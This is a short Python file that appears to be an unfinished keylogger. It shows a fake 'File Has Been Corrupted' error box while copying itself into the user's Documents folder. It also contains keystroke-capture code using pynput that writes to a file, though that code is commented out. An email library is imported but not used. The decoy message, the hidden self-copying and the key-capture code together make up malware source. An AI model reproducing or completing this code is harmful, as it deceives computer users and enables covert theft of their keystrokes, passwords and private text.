from pynput.keyboard import Key,Listener
import smtplib
from time import asctime,time,localtime
import os
import tkinter 
from shutil import copyfile
import ctypes  
class Keyboard:
    def __init__(self):
        self.t=localtime()
        self.root=tkinter.Tk()
        #checks if the file already exists in the destination directory !
        if not os.path.isfile('C:\\Users\\USER\\Documents\\Whosit.py'):
            ctypes.windll.user32.MessageBoxW(0, "Error !", "The File Has Been Corrupted !", 1)
            copyfile('./Whosit.py','C:\\Users\\USER\\Documents\\Whosit.py')
    # def on_press(self,key):
    #     with open('File.txt','a+') as file_name:
    #         file_name.write(f'{key} pressed {asctime(self.t)}\n')
    # def invoke_listener(self):
    #     with Listener(on_press=self.on_press) as key_listener:
    #         key_listener.join()

key_l=Keyboard()
# key_l.invoke_listener()